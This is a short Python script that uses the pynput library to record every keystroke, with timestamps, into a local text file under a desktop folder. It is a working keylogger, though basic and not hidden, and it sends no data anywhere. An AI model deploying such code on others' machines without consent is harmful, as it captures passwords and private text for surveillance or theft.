
from pynput.keyboard import Key, Listener
import logging

# logging #

log_dir = "D:/Desktop/client/"

logging.basicConfig(filename=(log_dir + "PyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
